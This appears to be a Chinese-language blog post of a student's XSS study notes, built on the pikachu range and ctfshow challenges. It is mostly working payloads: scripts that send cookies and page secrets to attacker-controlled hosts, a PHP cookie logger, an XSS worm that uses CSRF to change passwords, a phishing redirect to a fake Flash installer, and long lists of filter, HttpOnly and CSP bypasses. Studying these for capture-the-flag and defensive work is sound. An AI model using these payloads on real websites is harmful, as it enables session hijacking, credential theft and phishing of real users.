---
title: XSS
abbrlink: fe1aa8c3
date: 2026-03-07 23:37:02
tags:
  - xss
  - web
  - owatop10
categories:
  - 网安技术
---

## 前言

  之前一直没有系统的学习xss，有几个原因，一直觉得服务器太贵了，第二个就是js的语言没学好，按照我的学习计划，在寒假就应该将top10漏洞全部复习巩固完成。结果到开学的昨天，才把sql注入写完（可能是我个人太啰嗦了），现在开始我个人认为的top10中xss。

## 什么是xss

  XSS（跨站脚本攻击，Cross-Site Scripting{这里我在初学的时候，还了解了他的首字母明明是css，为什么叫xss攻击，是因为这和前端的css技术重合了，所以我们管这个攻击叫叉ss攻击，不读x哦}）是一种常见的网络安全攻击技术，攻击者通过在Web应用程序中注入恶意的客户端脚本代码，当其他用户访问页面时，这些脚本会在他们的浏览器中执行，从而窃取敏感信息或劫持用户会话。

  由于Web应用的功能多样性和浏览器渲染机制的差异，XSS攻击手法也因注入点和触发方式而不同：主要分为三种，例如**反射型XSS**中，攻击者将恶意脚本放在URL参数中，通过社交工程诱骗用户点击，服务端将脚本“反射”回页面执行；**存储型XSS**则更为危险，攻击者将恶意脚本直接存储在服务器端（如评论区、个人资料），任何访问受影响页面的用户都会成为受害者；而**DOM型XSS**完全在客户端发生，利用JavaScript动态修改DOM树时的不安全操作，通过`document.location`、`innerHTML`或`eval()`等函数将恶意代码插入页面。

  当然，由于现代浏览器引入了**CSP（内容安全策略）**、**HttpOnly Cookie**和**XSS过滤器**等防御机制，以及前端框架（如React、Vue）默认的转义处理，传统的XSS攻击难度有所增加。

## reflectXss的成因

  这里以pikachu靶场为例，这里直接将message的数据拼接到前端语言中，就会造成xss攻击

![image-20260304205157167](posts/fe1aa8c3/images/image-20260304205157167.webp)

如果我们将传参message为一段js代码，那么前端浏览器则会执行这个js代码

```js
<script>alert('yyssh')</script>
```

## storedXss的成因

  这里还是以pikachu靶场为例，还是message直接拼接到前端语言并输出，只不过他将数据保存到了后端数据库，意味着不止你会查看到这段数据（反射性xss原则上来说只有你一个人会执行这段代码），所有看到这段数据的人都会执行这段js代码，意味着这段js代码已被保留到了后端

![image-20260304205730674](posts/fe1aa8c3/images/image-20260304205730674.webp)

![image-20260304205713129](posts/fe1aa8c3/images/image-20260304205713129.webp)

## xss的各种利用方式

### 弹窗/控制台输出(验证xss)

  一般这是以src的标准，在打ctf比赛中，弹窗只可以确定该输入框具有xss漏洞，也算一种快捷验证方法(当然用字典更快)

弹窗：

```js
<script>alert('yyssh')</script>
<script>confirm('yyssh')</script>
<script>prompt('yyssh')</script>
```

+ `alert`：纯弹窗，`confirm`：多了两个确认取消按钮，`prompt`：多个输入框。（本质上都是弹窗）

控制台/网页输出：

```js
<script>console.log(3)</script>
<script>document.write(1)</script>
```

+ `console`:控制台输出，`document`:网页输出

### 跳转网页

  这是等同于超链接点击的，网页跳转

```js
<script>window.location.href="https://www.baidu.com"</script>
<meta content="1;http://www.baidu.com/" http-equiv="refresh">
```

+ `window`：整个浏览器界面，属于最上层建筑，像document是略写，完整的是window.document(三者是互等的)
	+ `loaction`:document用来管理url的属性值
		+ `href`:完整的url
+ `meta`:浏览器读取的元信息，不会显示在网页上，在head标签中
	+ `http-equiv`：模拟http头
		+ `refresh`：刷新并跳转
	+ `1`:等待1秒钟

### javascript伪协议

参考文章：[XSS跨站脚本攻击详解 - 宇星海 - 博客园](https://www.cnblogs.com/Yu-Xing-Hai/p/18597430/XSS#322--xss钓鱼)

  在浏览器的控制台输入`javascript:alert('1');`，依然可以执行弹窗，属于另外一种执行js代码的方式

1. javascript应用于所有可以输入url地址位置

	```js
	<a href=javascript:alert(1)>Click me</a>
	<iframe src=javascript:alert(2)></iframe>
	```

2. 如果只检验URL的合法性，可以采用下面方法进行绕过

	```js
	<iframe src=javascript://example.com/%0d%0aalert(1)></iframe>
	```

	+ `//example.com/`:将域名进行注释掉
	+ `%0d%0a`:回车和换行执行下面代码

### 获取cookie

  这里以ctfshow-web316为例，题目如下：

![image-20260304214649427](posts/fe1aa8c3/images/image-20260304214649427.webp)

我这里是使用的vps搭建的开源xss接收平台（推荐）

```js
<script>document.location.href='http://xxx/BlueLotus_XSSReceiver/index.php?a='+document.cookie</script>
```

+ `document`:代表整个网页
	+ `loaction`:document用来管理url的属性值
		+ `href`:完整的url
	+ `cookie`:document用来管理cookie的属性值

或者自己写一个简单的接收cookie的php代码（可写目录要给权限）

```php
<?php
  $cookie = $_GET['cookie'];
  $log = fopen("./uploads/cookie.txt", "a");
  fwrite($log, $cookie . "\n");
  fclose($log);
?>
```

### 获取面板信息

  这里以ctfshow-web329为例，题目如下：

![image-20260305172054657](posts/fe1aa8c3/images/image-20260305172054657.webp)

可以进行注册，登录，用户管理三个面板，用户管理面板只有管理员才可以查看。用户管理面板如下：

![image-20260305172206731](posts/fe1aa8c3/images/image-20260305172206731.webp)

可以看到用户名被输出了出来，密码也被输出了出来，这里我们对用户名进行xss攻击，题目的bot会定时才看用户管理面板，所以我们成功拿到管理员的cookie

```js
<input/**/onfocus="window.open('http://IP/'+document.cookie)"/**/autofocus>
```

但是这道题目还没结束，替换成管理员的cookie并不能进行登录，cookie会失效过期，这里你也可以打条件竞争（不是预期解），我们直接采用xss获取用户管理面板的信息即可

```js
<script>  
	$('.laytable-cell-1-0-1').each(function(index, value){      
		if(value.innerHTML.indexOf('ctf'+'show'+'{')>-1){           
			window.location.href='http://xxx/get.php?c='+value.innerHTML;
		}  
	});  
</script>
```

+ `$('.laytable-cell-1-0-1')`:css选择器，选择类为laytable-cell-1-0-1的元素(为什么选择这个，用f12可以看到)
	+ ![image-20260305175619839](posts/fe1aa8c3/images/image-20260305175619839.webp)
+ `each`：遍历这个列表的单元格
+ `function(index,value)`:index是遍历到的元素下标，value是遍历到的元素对象
	+ `innerHTML`:value对象的html代码，例如：value 是 `<td class="...">ctfshow{a..}</td>`，那么 value.innerHTML是ctfshow{a..}
	+ `indexOf(string)`：查找string第一次出现的位置，没找到返回-1
		+ `'ctf'+'show'+'{')>-1`:拼接字符串，并找到即将innerHTML返回到vps中

### 获取同一网站其他面板信息

  这里以ctfshow—web应用安全与防护为例，题目如下：
![image-20260306083224357](posts/fe1aa8c3/images/image-20260306083224357.webp)

题目描述是反射型，其实也是存储型，进去之后注册，登录即可来到下面界面

![image-20260306083536118](posts/fe1aa8c3/images/image-20260306083536118.webp)

签名处可以进行xss，然后保存让后端bot审核浏览即可获得flag，具体xss代码如下：

```js
<script>(async () => {
    try {
        // 请求页面并解析
        const profileText = await (await fetch('/profile', {credentials:'include'})).text();
        const doc = new DOMParser().parseFromString(profileText, 'text/html');
        
        // 获取#unpass的内容
        const secret = doc.querySelector('#upass')?.textContent || '';
        
        // 如果有内容就发送
        if (secret) {
            // 使用FormData发送普通POST请求
            const fd = new FormData();
            fd.append('data', secret);
            await fetch('http://你的服务器IP/receive.php', {method:'POST', body:fd, mode:'cors'});
        }
    } catch(e) {}
})();</script>
```

+ `async`:不等页面加载完成，即执行的异步请求
+ `await`:与异步请求一起执行的同步请求
+ `fetch`:浏览器请求相对路径('/profile')
+ `credentials:'include'`：表示携带当前界面的cookie进行访问
	+ `text`:将返回的响应体解析为纯文本
		+ `html->text`,`json->json`,`图片->blob`,`二进制->arrayBuffer`,`formData->formData(表单数据)`
+ `DOMParser`:创建一个解析器对象
	+ `parseFromString(profileText, 'text/html')` 将 profileText字符串解析成完整的 DOM 树
	+ `doc`:这个变量就相当于创建了profileText构成的虚拟网页的document
+ `querySelector`:查找css选择器
	+ `?.textContent || ''`:有结果返回就获取其textContent ，没有就取空
+ `FormData`:创建POST表单对象
	+ `append`:添加表单数据
+ `cors`：允许跨域请求

### 引入外部js

  通常用于绕过长度限制，所以引入外部js，外部js中包含xss代码(vps必须要有域名，实现与攻击目标保持相同协议，否则会报错)

  这里以ctfshow—web应用安全与防护中的编码绕过xss过滤为例，题目如下：
![image-20260306083224357](posts/fe1aa8c3/images/image-20260306083224357.webp)

题目描述是反射型，其实也是存储型，进去之后注册，登录即可来到下面界面

![image-20260306083536118](posts/fe1aa8c3/images/image-20260306083536118.webp)

和上一关不同的是，这关对长度进行了限制了，所以我们采取引入外部js的方式来绕过长度限制，这里我就上xss平台了（由于我的vps还没有买域名，无法上https，题目是https引入我的http外部js报错）

注册并登录：[后台首页](https://xssaq.com/dashboard)

1. 创建项目

2. 编写自定义代码（这个代码就是外部要引入的js）

3. 查看配置代码(任选一个即可，可以看到他的引入外部js都是使用`//xs.pe/080`，这个就是同协议，会根据目标服务器进行自动https或者http传输，我也是因为这个原因才选择了xss平台)

	![image-20260307113219770](posts/fe1aa8c3/images/image-20260307113219770.webp)

```js
<script src=//xxx.xxx/a.js></script>
```

### xss蠕虫

从xss到csrf，在论坛中制作蠕虫，属于存储型xss，对每一个浏览界面的进行csrf攻击

#### 发送get请求

```js
<img src="./pay.php?id=test">
```

#### 发送post请求

  这里以ctfshow-web331为例，题目如下：

![image-20260305204442676](posts/fe1aa8c3/images/image-20260305204442676.webp)

相较于上面的题目，多出了一个修改密码选项，虽然我们还是可以用上几题的获取面板信息来得到flag(不是预期解)，这里我们采用csrf攻击，我们设置用户名为一个js自动跳转和提交信息链接，当管理员浏览用户管理界面时，就会触发csrf攻击，从而完成自动信息提交，而这个信息提交是我们的修改密码表单，从而完成了csrf攻击。

现在的难点是如何让js自动完成post的表单提交

1. 利用环境自身的ajax表单提交（/js/select.js）

	```js
	<script>$.ajax({url:'api/change.php',type:'post',data:{p:'123'}});</script>
	<script>$.ajax({url:'api/amount.php',type:'post',data:{u:'123456',a:'9999'}});</script>
	```

	![image-20260305205201997](posts/fe1aa8c3/images/image-20260305205201997.webp)

2. 编写一个js提交

	```js
	<script>var httpRequest = new XMLHttpRequest();httpRequest.open('POST', 'http://127.0.0.1/api/change.php', true);httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");httpRequest.send('p=123');</script>
	```

#### 发送json请求

```js
<script>
var httpRequest = new XMLHttpRequest();
httpRequest.open('POST', 'http://127.0.0.1/api/change.php', true);
httpRequest.setRequestHeader("Content-type", "application/json");
httpRequest.send(JSON.stringify({p: "123"}));
</script>
```

或者使用fetch api的方式

```js
<script>
fetch('http://127.0.0.1/api/change.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({p: "123"})
});
</script>
```

### 钓鱼

  通常用于攻击队演练中，对防守方单位进行钓鱼邮件攻击

1. 结合弹窗和url跳转进行钓鱼

	```js
	<script>alert("您的浏览器插件版本过低，请更新您的flash版本"); window.location.href ="https://www.flash.cn/cdm/latest/flashplayer_install_cn.exe"</script>
	```

### 绕过

#### 标签内

正常我们的输入，一般是被标签包裹，例如：`<p>我们的代码</p>`

但是还有特殊情况，比如我们的输入被包裹进了value值，例如`<input value="我们的代码">`

这种情况就需要我们提前将标签闭合掉，这是一个举例，当然不同的标签可能有不同的闭合方式

```js
"><script>alert(1)</script>
```

#### script过滤

##### body绕过

```js
<body onload="window.open('http://IP/'+document.cookie)">
```

+ `onload`：所有元素加载完成之后加载的js代码
+ `window`：整个浏览器界面，属于最上层建筑，像document是略写，完整的是window.document
	+ `open`:打开一个新的标签页

##### input绕过

```js
<input onfocus="window.open('http://IP/'+document.cookie)" autofocus>
```

+ `input`:输入框
	+ `onfocus`:当鼠标聚焦时触发
	+ `autofocus`:自动聚焦
+ 测试无法与hidden搭配使用

##### svg绕过

```js
<svg onload="window.open('http://IP/'+document.cookie)">
```

+ 这个绕过让我查了一下资料，只要这个标签拥有加载属性，就可以进行onload

##### 常见标签替代绕过

| 标签 / 写法示例                                              | 常用事件处理器示例                       | 触发条件 / 说明                             | 备注 / 常见绕过场景                          |
| ------------------------------------------------------------ | ---------------------------------------- | ------------------------------------------- | -------------------------------------------- |
| `<img src=1>`                                                | `onerror`, `onload`                      | 图片加载失败/成功（最经典）                 | onerror 几乎必测                             |
| `<svg/onload=...>` 或 `<svg><script>`                        | `onload`, 内嵌 `<script>`                | SVG 自带 onload 或直接脚本                  | 绕过 script 过滤极强                         |
| `<math><mtext><script>...` 或 `<math><annotation-xml encoding="text/html">` | 内嵌 `<script>`, `onerror` 等            | MathML 命名空间切换 + mutation / 解析器混淆 | 常用于 sanitizer 绕过（如 DOMPurify bypass） |
| `<script src=//evil.com>`                                    | `onload`, `onerror`                      | 外部脚本加载后                              | onload 稳定                                  |
| `<iframe src=...>`                                           | `onload`, `srcdoc`                       | iframe 内容加载完成                         | src=javascript: 或 about:blank               |
| `<video><source src=...>`                                    | `onerror`, `onloadeddata`, `onplay`      | 视频加载相关                                | onerror 很稳                                 |
| `<audio src=...>`                                            | `onerror`, `onloadedmetadata`            | 音频加载失败/元数据                         | 与 video 类似                                |
| `<details open ontoggle=...>`                                | `ontoggle`                               | details 默认/被打开时触发                   | 无需交互，open 属性自动                      |
| `<link rel=stylesheet href=...>`                             | `onload`, `onerror`                      | CSS 加载成功/失败                           | 常绕过 script/img 过滤                       |
| `<marquee onstart=...>`                                      | `onstart`, `onfinish`                    | 跑马灯开始/结束(仅限老浏览器支持)           | 老系统/兼容模式好用                          |
| `<body>`                                                     | `onload`, `onpageshow`                   | 页面整体加载完成                            | 难注入，但持久型常见                         |
| `<a href=...>`                                               | `onmouseover`, `onclick`, `onfocus`      | 链接悬停/点击                               | onmouseover 悬停即触发                       |
| `<h1>`, `<anytag>`                                           | `onmouseover`, `onmouseenter`, `onclick` | 鼠标悬停/点击                               | 需要轻微交互                                 |
| `<button>`                                                   | `onclick`, `onmouseover`, `onfocus`      | 按钮点击/悬停                               | 需要交互                                     |
| `<embed src=...>`                                            | `onload`                                 | 嵌入资源加载                                | 老插件内容                                   |
| `<object data=...>`                                          | `onload`                                 | 对象数据加载                                | 与 embed 类似                                |
| `<input type=image src=...>`                                 | `onload`, `onerror`                      | 图片按钮加载                                | 少用，但有时绕过                             |
| `<track src=...>`                                            | `onload`, `onerror`                      | 视频字幕加载                                | video 内使用                                 |
| `<textarea>`                                                 | `onfocus`, `onmouseover`, `oninput`      | 文本框焦点/输入                             | onfocus 常结合 autofocus                     |
| `<image>` (非标准，等价 `<img>`)                             | 同 `<img>`                               | 同 img                                      | 老代码中偶尔出现                             |
| `<anytag oncopy=...>`                                        | `oncopy`, `oncut`, `onpaste`             | 用户复制/剪切/粘贴时                        | 需要用户手动操作                             |

#### on属性过滤

如果on开头属性被拦截了，只能采用javascript伪协议绕过了（只用需要url的地方即可采用这个），如下：

```js
<iframe src="javascript:alert(1)"></iframe>
```

#### 空格过滤

##### /绕过

空格用/替代即可，如下

```js
<input/onfocus="window.open('http://IP/'+document.cookie)"/autofocus>
```

##### /**/绕过

空格用/**/替代即可，如下

```js
<input/**/onfocus="window.open('http://IP/'+document.cookie)"/**/autofocus>
```

#### 括号绕过

##### 反引号绕过

```js
<script>alert`1`</script>
```

##### 赋值拼接伪协议绕过

```js
<video src onerror=a="%2",location="javascript:aler"+"t"+a+"81"+a+"9">
```

+ `%28`是（，`%29`是）
	+ 拼接之后正好成了`%281%29`=`(1)`

##### 异常抛出

```js
<video src onerror="javascript:window.onerror=alert;throw 1">
```

+ video标签触发异常之后，执行window的onerror，也就是alert，也是1

#### 单引号过滤

单引号，双引号，反引号都是互相替换的

```js
<script>alert('yyssh')</script>
<script>alert(`yyssh`)</script>
<script>alert("yyssh")</script>
```

#### 双引号过滤

单引号，双引号，反引号都是互相替换的

```js
<script>alert('yyssh')</script>
<script>alert(`yyssh`)</script>
<script>alert("yyssh")</script>
```

#### 反引号过滤

单引号，双引号，反引号都是互相替换的

```js
<script>alert('yyssh')</script>
<script>alert(`yyssh`)</script>
<script>alert("yyssh")</script>
```

#### 尖括号过滤

全角字符绕过

```text
＜script/src=//evil.site/poc.js＞
＜script＞alert(1)＜/script＞
```

#### 特殊字符绕过

##### base64编码绕过

原句：

```js
<script>alert("xss");</script>
```

绕过（注：eval里面直接写xss代码，不用再加上script标签，否则容易出现错误）：

```js
<script>eval(atob('YWxlcnQoMSk='))</script>
```

如果script被过滤，参考上面的其他标签绕过，标签内依然直接写入xss代码，无需加上script标签（引入外部js就另说）

##### URL全编码绕过

原句：

```js
<script>alert("xss");</script>
```

绕过：

```js
<script>eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))</script>
```

##### ASCII码绕过

原句：

```js
<script>alert("xss");</script>
```

绕过：

```js
<script>eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))</script>
```

##### Unicode编码绕过

原句：

```js
<script>alert("xss");</script>
```

绕过：

```js
<script>eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')</script>
```

##### 进制绕过

原句：

```js
<script>alert("xss");</script>
```

###### 16进制

```js
<script>eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')</script>
```

###### 8进制

```js
<script>eval('\141\154\145\162\164\50\61\51')</script>
```

##### 字符串拼接

原句：

```js
<script>alert("xss");</script>
```

绕过：

```js
<script>eval('a'+'l'+'e'+'r'+'t'+'(1)')</script>
```

##### HTML编码绕过

###### 16进制

原句：

```js
<iframe src=javascript:alert(1)>
```

绕过：

```js
<iframe src=&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```

###### ascii码

原句：

```js
<img src onerror=alert(1)>
```

绕过：

```js
<img src onerror=&#97;&#108;&#101;&#114;&#116;&lpar;&#49;&rpar;>
```

##### 匿名函数绕过

```js
<video/src/onerror=Function('ale'+'rt(1)')();>
```

+ `Function`:构造匿名函数
+ 最后的括号即是执行这个匿名函数

##### 加密函数绕过

```js
<video/src/onerror=top[8680439..toString(30)](1);>
<video/src/onerror=top[11189117..toString(32)](1);>
```

+ 在 JavaScript 中，数字可以直接调用方法，但语法上需要小数点。如果写成 `8680439.toString(30)`，第一个小数点会被解析为小数点，但后面的 `toString` 可能会引起歧义。因此用**两个点 `..`** 来明确告诉引擎：前面的数字结束，后面是方法调用。
+ `toString(30)`:数字转换为30进制，8680439转为`alert`
+ `toString(32)`:数字转换为32进制，11189117转为`alert`
+ `top`：顶层窗口即`window`

#### eval过滤

  由于前面的特殊字符串绕过，大多都需要eval执行编码转换，所以我们要先拿到eval

##### 事件处理器自动转换

经过测试只有unicode会被自动转换

```js
<img src=x onerror=\u0065val(atob('YWxlcnQoMSk=')) >
```

+ `\u0065`：unicode编码为e，将`eval`全编码也可以

##### 匿名函数+模板字符串绕过

```js
<img src=x onerror="Function`a${atob`YWxlcnQoMSk=`}```">
```

+ 这个a不能删除

```js
<img src=x onerror="``.constructor.constructor`a${atob`YWxlcnQoMSk=`}```">
```

+ ``.constructor.constructor等于Function
	+ 因为 `` 是 String 类型,所有函数的构造函数都是 Function

#### http-only绕过

参考文章：[珂技系列之一篇就够了——XSS进阶 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/262013.html)

1. HttpOnly作用：让该cookie只能用于HTTP/HTTPS传输，使得客户端JavaScript脚本无法读取cookie，这在一定程度上减少了XSS漏洞带来的危害。
2. PHP在配置文件中开启会话Cookie的HttpOnly属性：`session.cookie_httponly=On`

  在php中，phpinfo会显示访问该界面的cookie，如果我们让受害者访问这个界面，然后同域读取界面即可拿到cookie

在有xss界面，打入一下xss代码即可

```js
<script>
function createXmlHttp() {
    if (window.XMLHttpRequest) {
       xmlHttp = new XMLHttpRequest();               
    } else {
       xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
}

function getS() {
    var Url = 'http://127.0.0.1/phpinfo.php';
    createXmlHttp();
    xmlHttp.onreadystatechange = writeS;
    xmlHttp.open("GET", Url, true);
    xmlHttp.send(null);
}

function writeS() {
    if (xmlHttp.readyState == 4) {
      var x = xmlHttp.responseText.match(/HTTP_COOKIE.+?<\/td><td.+?>([\w\W]+?)<\/td>/);
	  alert(x);   
    }
}
getS();
</script>
```

+ `onreadystatechange` 是一个事件（状态改变时触发），将这个事件绑定到writeS函数上
+ 同域发起请求，类似于csrf，并用正则匹配cookie内容，将cookie以弹窗的形式发送

#### 长度绕过

  直接引用外部js，即可绕过长度限制，但是这又涉及到了CSP的绕过（文章后面）

#### csp绕过

参考文章：[珂技系列之一篇就够了——XSS进阶 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/262013.html)

简单来说，csp就是一个白名单，只有白名单以内的规定的内容出现在页面中，才会执行渲染，否则浏览器则会进行阻止，如下：

```http
Content-Security-Policy: default-src 'self' www.baidu.com; script-src 'unsafe-inline'
```

+ `default-src`:默认的所有资源加载规则
	+ `'self'`：只允许同域名加载
	+ `'none'`:同域名也不允许加载
	+ `*`:所有域名都可以加载
	+ `www.baidu.com`:允许的域名白名单
	+ `unsafe-inline`:只有当前页面可以加载

| 脚本加载方式                                            | default-src 'self' | default-src 'self' www.baidu.com | default-src 'self'; script-src 'unsafe-inline' | default-src 'self' www.baidu.com; script-src 'unsafe-inline' |
| ------------------------------------------------------- | ------------------ | -------------------------------- | ---------------------------------------------- | ------------------------------------------------------------ |
| `<script src="/local.js"></script>`                     | ✅                  | ✅                                | ✅                                              | ✅                                                            |
| `<script src="//xxx.xxx/a.js"></script>`                | ❌                  | ❌                                | ❌                                              | ❌                                                            |
| `<script src="www.baidu.com/xxx.js"></script>`          | ❌                  | ✅                                | ❌                                              | ✅                                                            |
| `<script>alert(1);</script>`                            | ❌                  | ❌                                | ✅                                              | ✅                                                            |
| `<script src="https://www.baidu.com/api.js"></script>`  | ❌                  | ✅                                | ❌                                              | ✅                                                            |
| `<script src="//img.baidu.com/1.js"></script>`          | ❌                  | ❌                                | ❌                                              | ❌                                                            |
| `<script src="http://127.0.0.1/test.js"></script>`      | ❌                  | ❌                                | ❌                                              | ❌                                                            |
| `<script src="data:text/javascript,alert(1)"></script>` | ❌                  | ❌                                | ❌                                              | ❌                                                            |
| `<script>eval('alert(1)');</script>`                    | ❌                  | ❌                                | ❌                                              | ❌                                                            |

**注意：在有csp策略下，eval相关 默认禁止，需要显式添加`unsafe-eval`**

##### location.href跳转绕过

参考文章：[我的CSP绕过思路及总结-先知社区](https://xz.aliyun.com/news/4716)

  简单来说，csp不限制跳转，但是容易被发现，因为网页会进行整个跳转。

```js
<script>window.location.href="https://www.baidu.com"</script>
```

##### jsonp绕过

利用条件：

1. csp存在白名单站点
2. 白名单站点存在可控callback函数

jsonp简单来说就是可以执行csp白名单的js代码，并接收做出一定响应

案例：

靶场存在csp规则如下：

```http
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src https://www.google.com">
```

谷歌存在jsonp接口

```text
https://www.google.com/complete/search?client=chrome&q=hello&callback=showSuggestion
```

谷歌会返回

```js
showSuggestion(["hello", ["hello world", "hello kitty"]]);
```

如果callback可控，那我们进行弹窗呢

```text
https://www.google.com/complete/search?client=chrome&q=hello&callback=alert(1)
```

然后我们对靶机进行注入

```js
<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert(1)//"></script>
```

+ `//`:把谷歌的正常回显注释掉，以免干扰我们的js代码执行
+ 靶机允许谷歌加载js，谷歌的jsonp可控，从而成功绕过靶机的csp

其他的绕过感觉限制条件太多了，具体请看参考文章：[我的CSP绕过思路及总结-先知社区](https://xz.aliyun.com/news/4716)

